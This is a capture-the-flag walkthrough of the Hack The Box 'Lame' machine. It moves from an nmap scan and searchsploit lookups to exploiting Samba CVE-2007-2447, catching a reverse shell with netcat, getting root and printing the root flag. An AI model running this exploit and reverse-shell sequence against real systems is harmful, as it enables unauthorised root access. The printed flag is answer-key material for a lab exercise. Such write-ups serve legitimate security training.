---
title: Lame
layout: post
author: Bit Criminals Team
date: 2021-08-05 20:30:00 +0530
type: Pentesting
difficulty: Easy
prompt: https://app.hackthebox.eu/machine/Lame
---

## STEP_1 ==> NMAP Scan

```
└─$ nmap -Pn -T5 -A 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-06 00:31 IST
Nmap scan report for 10.10.10.3
Host is up (0.17s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m26s, deviation: 2h49m45s, median: 24s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-08-05T15:01:51-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.18 seconds
```

## STEP_2 ==> Searching exploit port:21
```
└─$ searchsploit vsftpd              
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption              | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)              | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)              | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                            | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                   | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                      | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                     | multiple/remote/49719.py
---------------------------------------------------------------------------- ---------------------------------
```
Nothing here useful

  
## STEP_3 ==> Searching exploit port:139

```
└─$ searchsploit samba 3.0.20                                                                             1 ⨯
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                      | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasp | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                       | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                       | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                               | linux_x86/dos/36741.py
---------------------------------------------------------------------------- ---------------------------------
```

>https://github.com/amriunix/CVE-2007-2447/blob/master/usermap_script.py


## STEP_4 ==> Getting Shell

```bash
python3 usermap_script.py 10.10.10.3 445 10.10.14.12 4222
```
```
└─$ python3 usermap_script.py 10.10.10.3 445 10.10.14.12 4222
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```


## STEP_5 ==> Getting flag

```
└─$ nc -lnvp 4222         
listening on [any] 4222 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.3] 56227
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
whoami
root
cd root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
2969fdb7e84e5ab492d5c02262154310
```
